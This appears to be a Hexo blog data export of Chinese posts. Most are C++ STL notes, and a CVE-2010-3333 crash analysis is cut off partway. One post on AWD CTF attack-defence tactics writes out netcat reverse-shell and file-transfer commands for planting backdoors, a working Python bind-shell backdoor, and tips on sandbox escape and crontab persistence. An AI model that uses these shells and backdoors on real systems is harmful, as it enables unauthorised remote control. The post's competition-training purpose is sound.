|\n| :---: | :---: |\n| empty() | 是否为空，空返回true |\n| pop() | 弹栈 |\n| push() | 压栈 |\n| size() | 返回栈元素数目 |\n| top() | 返回栈顶元素 |","slug":"C-STL-Stack","published":1,"updated":"2017-02-17T07:12:14.948Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jyg000zhv18t2jf8t2x","content":"<h2 id=\"Stack\"><a href=\"#Stack\" class=\"headerlink\" title=\"Stack\"></a>Stack</h2><p>实现了栈的全部功能，(FIFO)数据结构。</p>\n<p><code>#include&lt;stack&gt;</code></p>\n<h2 id=\"成员函数\"><a href=\"#成员函数\" class=\"headerlink\" title=\"成员函数\"></a>成员函数</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数</th>\n<th style=\"text-align:center\">用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">empty()</td>\n<td style=\"text-align:center\">是否为空，空返回true</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">pop()</td>\n<td style=\"text-align:center\">弹栈</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">push()</td>\n<td style=\"text-align:center\">压栈</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">size()</td>\n<td style=\"text-align:center\">返回栈元素数目</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">top()</td>\n<td style=\"text-align:center\">返回栈顶元素</td>\n</tr>\n</tbody>\n</table>\n","excerpt":"","more":"<h2 id=\"Stack\"><a href=\"#Stack\" class=\"headerlink\" title=\"Stack\"></a>Stack</h2><p>实现了栈的全部功能，(FIFO)数据结构。</p>\n<p><code>#include&lt;stack&gt;</code></p>\n<h2 id=\"成员函数\"><a href=\"#成员函数\" class=\"headerlink\" title=\"成员函数\"></a>成员函数</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数</th>\n<th style=\"text-align:center\">用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">empty()</td>\n<td style=\"text-align:center\">是否为空，空返回true</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">pop()</td>\n<td style=\"text-align:center\">弹栈</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">push()</td>\n<td style=\"text-align:center\">压栈</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">size()</td>\n<td style=\"text-align:center\">返回栈元素数目</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">top()</td>\n<td style=\"text-align:center\">返回栈顶元素</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"C++ STL poriority_queue","date":"2017-03-17T04:36:37.000Z","_content":"\n## poriority_queue\n\n排在队首的是优先级最高的节点，越大的`int`优先级越高。对于自定义的数据类型，不需要准确的定义优先级的大小，只要能相互比较大小即可。\n\n模板定义如下：\n\n```\ntemplate <class T, class Container = vector<T>, class Compare = less<typename Container::value_type> > class priority_queue;\n```\n\n## 成员函数\n\n|函数|用法|\n|:--:|:--:|\n|empty()|判断是否非空|\n|size()|返回有限队列大小|\n|top()|返回优先级最大的node的值|\n|push()|插入一个元素|\n|emplace()|建立并插入一个元素|\n|pop()|弹出优先队列的优先级最大的node|\n|swap()|交换两个优先队列|","source":"_posts/C-STL-poriority-queue.md","raw":"---\ntitle: C++ STL poriority_queue\ntags:\n  - STL\ncategories: []\ndate: 2017-03-17 12:36:37\n---\n\n## poriority_queue\n\n排在队首的是优先级最高的节点，越大的`int`优先级越高。对于自定义的数据类型，不需要准确的定义优先级的大小，只要能相互比较大小即可。\n\n模板定义如下：\n\n```\ntemplate <class T, class Container = vector<T>, class Compare = less<typename Container::value_type> > class priority_queue;\n```\n\n## 成员函数\n\n|函数|用法|\n|:--:|:--:|\n|empty()|判断是否非空|\n|size()|返回有限队列大小|\n|top()|返回优先级最大的node的值|\n|push()|插入一个元素|\n|emplace()|建立并插入一个元素|\n|pop()|弹出优先队列的优先级最大的node|\n|swap()|交换两个优先队列|","slug":"C-STL-poriority-queue","published":1,"updated":"2017-03-17T05:00:43.082Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jyi0012hv185jrjmnrc","content":"<h2 id=\"poriority-queue\"><a href=\"#poriority-queue\" class=\"headerlink\" title=\"poriority_queue\"></a>poriority_queue</h2><p>排在队首的是优先级最高的节点，越大的<code>int</code>优先级越高。对于自定义的数据类型，不需要准确的定义优先级的大小，只要能相互比较大小即可。</p>\n<p>模板定义如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"keyword\">class</span> T, <span class=\"keyword\">class</span> Container = <span class=\"built_in\">vector</span>&lt;T&gt;, <span class=\"keyword\">class</span> Compare = less&lt;<span class=\"keyword\">typename</span> Container::value_type&gt; &gt; <span class=\"keyword\">class</span> priority_queue;</div></pre></td></tr></table></figure>\n<h2 id=\"成员函数\"><a href=\"#成员函数\" class=\"headerlink\" title=\"成员函数\"></a>成员函数</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数</th>\n<th style=\"text-align:center\">用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">empty()</td>\n<td style=\"text-align:center\">判断是否非空</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">size()</td>\n<td style=\"text-align:center\">返回有限队列大小</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">top()</td>\n<td style=\"text-align:center\">返回优先级最大的node的值</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">push()</td>\n<td style=\"text-align:center\">插入一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">emplace()</td>\n<td style=\"text-align:center\">建立并插入一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">pop()</td>\n<td style=\"text-align:center\">弹出优先队列的优先级最大的node</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">swap()</td>\n<td style=\"text-align:center\">交换两个优先队列</td>\n</tr>\n</tbody>\n</table>\n","excerpt":"","more":"<h2 id=\"poriority-queue\"><a href=\"#poriority-queue\" class=\"headerlink\" title=\"poriority_queue\"></a>poriority_queue</h2><p>排在队首的是优先级最高的节点，越大的<code>int</code>优先级越高。对于自定义的数据类型，不需要准确的定义优先级的大小，只要能相互比较大小即可。</p>\n<p>模板定义如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"keyword\">class</span> T, <span class=\"keyword\">class</span> Container = <span class=\"built_in\">vector</span>&lt;T&gt;, <span class=\"keyword\">class</span> Compare = less&lt;<span class=\"keyword\">typename</span> Container::value_type&gt; &gt; <span class=\"keyword\">class</span> priority_queue;</div></pre></td></tr></table></figure>\n<h2 id=\"成员函数\"><a href=\"#成员函数\" class=\"headerlink\" title=\"成员函数\"></a>成员函数</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数</th>\n<th style=\"text-align:center\">用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">empty()</td>\n<td style=\"text-align:center\">判断是否非空</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">size()</td>\n<td style=\"text-align:center\">返回有限队列大小</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">top()</td>\n<td style=\"text-align:center\">返回优先级最大的node的值</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">push()</td>\n<td style=\"text-align:center\">插入一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">emplace()</td>\n<td style=\"text-align:center\">建立并插入一个元素</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">pop()</td>\n<td style=\"text-align:center\">弹出优先队列的优先级最大的node</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">swap()</td>\n<td style=\"text-align:center\">交换两个优先队列</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"C++ STL使用目录","date":"2017-02-17T06:33:22.000Z","_content":"\n刷PAT甲级时顺便学习了下STL的用法。\n\n## STL头文件和容器类\n\n| #include | Container Class | 用法 |\n| :--------------: | :-------------------------: | :--: |\n| deque | deque | 双端队列 |\n| list | list | 列表 |\n| map | [map](../../../../2017/02/19/C-STL-Map/) | 映射 |\n| queue | [queue, poriority_queue](../../../../2017/03/17/C-STL-poriority-queue/) | 队列 |\n| set | [set](../../../../2017/2/18/C-STL-Set/), multiset | 集合 |\n| stack | [stack](../../../../2017/2/17/C-STL-Stack/) | 栈 |\n| vector | vector | 变长数组 |","source":"_posts/C-STL使用目录.md","raw":"---\ntitle: C++ STL使用目录\ntags:\n  - STL\ncategories: []\ndate: 2017-02-17 14:33:22\n---\n\n刷PAT甲级时顺便学习了下STL的用法。\n\n## STL头文件和容器类\n\n| #include | Container Class | 用法 |\n| :--------------: | :-------------------------: | :--: |\n| deque | deque | 双端队列 |\n| list | list | 列表 |\n| map | [map](../../../../2017/02/19/C-STL-Map/) | 映射 |\n| queue | [queue, poriority_queue](../../../../2017/03/17/C-STL-poriority-queue/) | 队列 |\n| set | [set](../../../../2017/2/18/C-STL-Set/), multiset | 集合 |\n| stack | [stack](../../../../2017/2/17/C-STL-Stack/) | 栈 |\n| vector | vector | 变长数组 |","slug":"C-STL使用目录","published":1,"updated":"2017-03-17T06:24:58.875Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jyl0014hv18gty7rwvt","content":"<p>刷PAT甲级时顺便学习了下STL的用法。</p>\n<h2 id=\"STL头文件和容器类\"><a href=\"#STL头文件和容器类\" class=\"headerlink\" title=\"STL头文件和容器类\"></a>STL头文件和容器类</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">#include</th>\n<th style=\"text-align:center\">Container Class</th>\n<th style=\"text-align:center\">用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">deque</td>\n<td style=\"text-align:center\">deque</td>\n<td style=\"text-align:center\">双端队列</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">list</td>\n<td style=\"text-align:center\">list</td>\n<td style=\"text-align:center\">列表</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">map</td>\n<td style=\"text-align:center\"><a href=\"../../../../2017/02/19/C-STL-Map/\">map</a></td>\n<td style=\"text-align:center\">映射</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">queue</td>\n<td style=\"text-align:center\"><a href=\"../../../../2017/03/17/C-STL-poriority-queue/\">queue, poriority_queue</a></td>\n<td style=\"text-align:center\">队列</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">set</td>\n<td style=\"text-align:center\"><a href=\"../../../../2017/2/18/C-STL-Set/\">set</a>, multiset</td>\n<td style=\"text-align:center\">集合</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stack</td>\n<td style=\"text-align:center\"><a href=\"../../../../2017/2/17/C-STL-Stack/\">stack</a></td>\n<td style=\"text-align:center\">栈</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vector</td>\n<td style=\"text-align:center\">vector</td>\n<td style=\"text-align:center\">变长数组</td>\n</tr>\n</tbody>\n</table>\n","excerpt":"","more":"<p>刷PAT甲级时顺便学习了下STL的用法。</p>\n<h2 id=\"STL头文件和容器类\"><a href=\"#STL头文件和容器类\" class=\"headerlink\" title=\"STL头文件和容器类\"></a>STL头文件和容器类</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">#include</th>\n<th style=\"text-align:center\">Container Class</th>\n<th style=\"text-align:center\">用法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">deque</td>\n<td style=\"text-align:center\">deque</td>\n<td style=\"text-align:center\">双端队列</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">list</td>\n<td style=\"text-align:center\">list</td>\n<td style=\"text-align:center\">列表</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">map</td>\n<td style=\"text-align:center\"><a href=\"../../../../2017/02/19/C-STL-Map/\">map</a></td>\n<td style=\"text-align:center\">映射</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">queue</td>\n<td style=\"text-align:center\"><a href=\"../../../../2017/03/17/C-STL-poriority-queue/\">queue, poriority_queue</a></td>\n<td style=\"text-align:center\">队列</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">set</td>\n<td style=\"text-align:center\"><a href=\"../../../../2017/2/18/C-STL-Set/\">set</a>, multiset</td>\n<td style=\"text-align:center\">集合</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stack</td>\n<td style=\"text-align:center\"><a href=\"../../../../2017/2/17/C-STL-Stack/\">stack</a></td>\n<td style=\"text-align:center\">栈</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vector</td>\n<td style=\"text-align:center\">vector</td>\n<td style=\"text-align:center\">变长数组</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"CTF线下赛AWD中Pwn选手该如何生存","date":"2017-05-15T23:43:00.000Z","_content":"\n## 关于赛前准备\n\n### Sandbox\n\n这两天准备XNUCA的时候一直在考虑沙盒的事情，因为awd中沙盒可以有效的保证在开局不会被打成筛子，在写沙盒的时候我又有了很多种可以选择的技术方案\n\n+ ptrace\n+ seccomp bpf\n+ chroot\n+ LD_PRELOAD\n\n### excape Sandbox\n\n+ ptrace\n\n1. fork/vfork/clone\n2. kill parent process\n3. change arch(32 -> 64/64 -> 32ABI)\n\n+ seccomp(not easy to use in awd)\n\n### Patch艺术\n\n1. inline patch\n\n## 后渗透\n\n1. nc 接收文件与传文件，我们可以将后门通过这种方式传过去\n`nc -l -p port > filename`\n`nc -q 1 dest_ip port < filename`（-q 传输完成1秒后断开连接）\n\n2. nc反向连接\n远程`nc -c /bin/sh local_ip locat_port`\n`/bin/sh | nc local_ip local_port`\n本地监听`nc -l -p local_port -vvv`\n\n3. python的一个后门\n\n```python\n#!/usr/bin/env python\n# coding=utf-8\n\nimport socket\nimport os\nimport sys\nimport subprocess\n\ndef makeio():\n    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    c.bind(('0.0.0.0', 10005))\n    c.listen(1)\n    s, a = c.accept()\n    return s, a\n\ndef interactive(s):\n    while True:\n        data = s.recv(1024)\n        if data == 'exit\\n':\n            return 0\n        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdoutput = proc.stdout.read() + proc.stderr.read()\n        s.send(stdoutput)\n\ndef closeio(s):\n    s.close()\n\nif __name__ == '__main__':\n    s, a = makeio()\n    interactive(s)\n    closeio(s)\n    sys.exit()\n```\n说是后门，其实也就是绑定端口后连接，参考了[这个](https://github.com/jeffreysasaki/backdoor)\n\n4. wget下载文件\n\n```bash\nwget -O ./filename URL\n```\n\n5. crontab\n\n`crontab [-e | -l]`","source":"_posts/CTF线下赛AWD中Pwn选手该如何生存.md","raw":"---\ntitle: CTF线下赛AWD中Pwn选手该如何生存\ntags:\n  - PWN\n  - AWD\ncategories: []\ndate: 2017-05-16 07:43:00\n---\n\n## 关于赛前准备\n\n### Sandbox\n\n这两天准备XNUCA的时候一直在考虑沙盒的事情，因为awd中沙盒可以有效的保证在开局不会被打成筛子，在写沙盒的时候我又有了很多种可以选择的技术方案\n\n+ ptrace\n+ seccomp bpf\n+ chroot\n+ LD_PRELOAD\n\n### excape Sandbox\n\n+ ptrace\n\n1. fork/vfork/clone\n2. kill parent process\n3. change arch(32 -> 64/64 -> 32ABI)\n\n+ seccomp(not easy to use in awd)\n\n### Patch艺术\n\n1. inline patch\n\n## 后渗透\n\n1. nc 接收文件与传文件，我们可以将后门通过这种方式传过去\n`nc -l -p port > filename`\n`nc -q 1 dest_ip port < filename`（-q 传输完成1秒后断开连接）\n\n2. nc反向连接\n远程`nc -c /bin/sh local_ip locat_port`\n`/bin/sh | nc local_ip local_port`\n本地监听`nc -l -p local_port -vvv`\n\n3. python的一个后门\n\n```python\n#!/usr/bin/env python\n# coding=utf-8\n\nimport socket\nimport os\nimport sys\nimport subprocess\n\ndef makeio():\n    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    c.bind(('0.0.0.0', 10005))\n    c.listen(1)\n    s, a = c.accept()\n    return s, a\n\ndef interactive(s):\n    while True:\n        data = s.recv(1024)\n        if data == 'exit\\n':\n            return 0\n        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdoutput = proc.stdout.read() + proc.stderr.read()\n        s.send(stdoutput)\n\ndef closeio(s):\n    s.close()\n\nif __name__ == '__main__':\n    s, a = makeio()\n    interactive(s)\n    closeio(s)\n    sys.exit()\n```\n说是后门，其实也就是绑定端口后连接，参考了[这个](https://github.com/jeffreysasaki/backdoor)\n\n4. wget下载文件\n\n```bash\nwget -O ./filename URL\n```\n\n5. crontab\n\n`crontab [-e | -l]`","slug":"CTF线下赛AWD中Pwn选手该如何生存","published":1,"updated":"2017-12-14T13:22:34.185Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jyr0017hv18s1tt2xf4","content":"<h2 id=\"关于赛前准备\"><a href=\"#关于赛前准备\" class=\"headerlink\" title=\"关于赛前准备\"></a>关于赛前准备</h2><h3 id=\"Sandbox\"><a href=\"#Sandbox\" class=\"headerlink\" title=\"Sandbox\"></a>Sandbox</h3><p>这两天准备XNUCA的时候一直在考虑沙盒的事情，因为awd中沙盒可以有效的保证在开局不会被打成筛子，在写沙盒的时候我又有了很多种可以选择的技术方案</p>\n<ul>\n<li>ptrace</li>\n<li>seccomp bpf</li>\n<li>chroot</li>\n<li>LD_PRELOAD</li>\n</ul>\n<h3 id=\"excape-Sandbox\"><a href=\"#excape-Sandbox\" class=\"headerlink\" title=\"excape Sandbox\"></a>excape Sandbox</h3><ul>\n<li>ptrace</li>\n</ul>\n<ol>\n<li>fork/vfork/clone</li>\n<li>kill parent process</li>\n<li>change arch(32 -&gt; 64/64 -&gt; 32ABI)</li>\n</ol>\n<ul>\n<li>seccomp(not easy to use in awd)</li>\n</ul>\n<h3 id=\"Patch艺术\"><a href=\"#Patch艺术\" class=\"headerlink\" title=\"Patch艺术\"></a>Patch艺术</h3><ol>\n<li>inline patch</li>\n</ol>\n<h2 id=\"后渗透\"><a href=\"#后渗透\" class=\"headerlink\" title=\"后渗透\"></a>后渗透</h2><ol>\n<li><p>nc 接收文件与传文件，我们可以将后门通过这种方式传过去<br><code>nc -l -p port &gt; filename</code><br><code>nc -q 1 dest_ip port &lt; filename</code>（-q 传输完成1秒后断开连接）</p>\n</li>\n<li><p>nc反向连接<br>远程<code>nc -c /bin/sh local_ip locat_port</code><br><code>/bin/sh | nc local_ip local_port</code><br>本地监听<code>nc -l -p local_port -vvv</code></p>\n</li>\n<li><p>python的一个后门</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> socket</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> subprocess</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">makeio</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class=\"line\">    c.bind((<span class=\"string\">'0.0.0.0'</span>, <span class=\"number\">10005</span>))</div><div class=\"line\">    c.listen(<span class=\"number\">1</span>)</div><div class=\"line\">    s, a = c.accept()</div><div class=\"line\">    <span class=\"keyword\">return</span> s, a</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">interactive</span><span class=\"params\">(s)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\">        data = s.recv(<span class=\"number\">1024</span>)</div><div class=\"line\">        <span class=\"keyword\">if</span> data == <span class=\"string\">'exit\\n'</span>:</div><div class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span></div><div class=\"line\">        proc = subprocess.Popen(data, shell=<span class=\"keyword\">True</span>, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)</div><div class=\"line\">        stdoutput = proc.stdout.read() + proc.stderr.read()</div><div class=\"line\">        s.send(stdoutput)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">closeio</span><span class=\"params\">(s)</span>:</span></div><div class=\"line\">    s.close()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    s, a = makeio()</div><div class=\"line\">    interactive(s)</div><div class=\"line\">    closeio(s)</div><div class=\"line\">    sys.exit()</div></pre></td></tr></table></figure>\n<p>说是后门，其实也就是绑定端口后连接，参考了<a href=\"https://github.com/jeffreysasaki/backdoor\" target=\"_blank\" rel=\"external\">这个</a></p>\n<ol>\n<li>wget下载文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget -O ./filename URL</div></pre></td></tr></table></figure>\n<ol>\n<li>crontab</li>\n</ol>\n<p><code>crontab [-e | -l]</code></p>\n","excerpt":"","more":"<h2 id=\"关于赛前准备\"><a href=\"#关于赛前准备\" class=\"headerlink\" title=\"关于赛前准备\"></a>关于赛前准备</h2><h3 id=\"Sandbox\"><a href=\"#Sandbox\" class=\"headerlink\" title=\"Sandbox\"></a>Sandbox</h3><p>这两天准备XNUCA的时候一直在考虑沙盒的事情，因为awd中沙盒可以有效的保证在开局不会被打成筛子，在写沙盒的时候我又有了很多种可以选择的技术方案</p>\n<ul>\n<li>ptrace</li>\n<li>seccomp bpf</li>\n<li>chroot</li>\n<li>LD_PRELOAD</li>\n</ul>\n<h3 id=\"excape-Sandbox\"><a href=\"#excape-Sandbox\" class=\"headerlink\" title=\"excape Sandbox\"></a>excape Sandbox</h3><ul>\n<li>ptrace</li>\n</ul>\n<ol>\n<li>fork/vfork/clone</li>\n<li>kill parent process</li>\n<li>change arch(32 -&gt; 64/64 -&gt; 32ABI)</li>\n</ol>\n<ul>\n<li>seccomp(not easy to use in awd)</li>\n</ul>\n<h3 id=\"Patch艺术\"><a href=\"#Patch艺术\" class=\"headerlink\" title=\"Patch艺术\"></a>Patch艺术</h3><ol>\n<li>inline patch</li>\n</ol>\n<h2 id=\"后渗透\"><a href=\"#后渗透\" class=\"headerlink\" title=\"后渗透\"></a>后渗透</h2><ol>\n<li><p>nc 接收文件与传文件，我们可以将后门通过这种方式传过去<br><code>nc -l -p port &gt; filename</code><br><code>nc -q 1 dest_ip port &lt; filename</code>（-q 传输完成1秒后断开连接）</p>\n</li>\n<li><p>nc反向连接<br>远程<code>nc -c /bin/sh local_ip locat_port</code><br><code>/bin/sh | nc local_ip local_port</code><br>本地监听<code>nc -l -p local_port -vvv</code></p>\n</li>\n<li><p>python的一个后门</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> socket</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> subprocess</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">makeio</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class=\"line\">    c.bind((<span class=\"string\">'0.0.0.0'</span>, <span class=\"number\">10005</span>))</div><div class=\"line\">    c.listen(<span class=\"number\">1</span>)</div><div class=\"line\">    s, a = c.accept()</div><div class=\"line\">    <span class=\"keyword\">return</span> s, a</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">interactive</span><span class=\"params\">(s)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\">        data = s.recv(<span class=\"number\">1024</span>)</div><div class=\"line\">        <span class=\"keyword\">if</span> data == <span class=\"string\">'exit\\n'</span>:</div><div class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span></div><div class=\"line\">        proc = subprocess.Popen(data, shell=<span class=\"keyword\">True</span>, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)</div><div class=\"line\">        stdoutput = proc.stdout.read() + proc.stderr.read()</div><div class=\"line\">        s.send(stdoutput)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">closeio</span><span class=\"params\">(s)</span>:</span></div><div class=\"line\">    s.close()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    s, a = makeio()</div><div class=\"line\">    interactive(s)</div><div class=\"line\">    closeio(s)</div><div class=\"line\">    sys.exit()</div></pre></td></tr></table></figure>\n<p>说是后门，其实也就是绑定端口后连接，参考了<a href=\"https://github.com/jeffreysasaki/backdoor\">这个</a></p>\n<ol>\n<li>wget下载文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget -O ./filename URL</div></pre></td></tr></table></figure>\n<ol>\n<li>crontab</li>\n</ol>\n<p><code>crontab [-e | -l]</code></p>\n"},{"title":"CVE-2010-3333","date":"2017-05-09T16:04:20.000Z","_content":"\n## 前\n\n2017SSCTF中遇到，顺便学习，第一次接触CVE和win的漏洞。\n\n## 环境\n\nwin7 sp1 简体中文\nword2003简体中文\n\n## crash分析\n\n这个漏洞就是一个单纯栈溢出漏洞。\n先从一个crash样本开始。样本按照《漏洞战争》说明生成即可。\n\n首先已经知道出问题的地方在rtf文档的画图属性，由于没有正确计算参数的长度，导致strcpy的时候产生了溢出。\n先查看crash文档的内容。\n\n![1](1.png)\n\n发现在一定长度后填充的大量的字符串。\nwindbg附加到word上，查看崩溃现场。\n\n![2](2.png)","source":"_posts/CVE-2010-3333.md","raw":"---\ntitle: CVE-2010-3333\ntags:\n  - CVE\n  - Win\ncategories: []\ndate: 2017-05-10 00:04:20\n---\n\n## 前\n\n2017SSCTF中遇到，顺便学习，第一次接触CVE和win的漏洞。\n\n## 环境\n\nwin7 sp1 简体中文\nword2003简体中文\n\n## crash分析\n\n这个漏洞就是一个单纯栈溢出漏洞。\n先从一个crash样本开始。样本按照《漏洞战争》说明生成即可。\n\n首先已经知道出问题的地方在rtf文档的画图属性，由于没有正确计算参数的长度，导致strcpy的时候产生了溢出。\n先查看crash文档的内容。\n\n![1](1.png)\n\n发现在一定长度后填充的大量的字符串。\nwindbg附加到word上，查看崩溃现场。\n\n![2](2.png)","slug":"CVE-2010-3333","published":1,"updated":"2017-05-10T00:15:57.121Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jyt0019hv18e8ezga5b","content":"<h2 id=\"前\"><a href=\"#前\" class=\"headerlink\" title=\"前\"></a>前</h2><p>2017SSCTF中遇到，顺便学习，第一次接触CVE和win的漏洞。</p>\n<h2 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h2><p>win7 sp1 简体中文<br>word2003简体中文</p>\n<h2 id=\"crash分析\"><a href=\"#crash分析\" class=\"headerlink\" 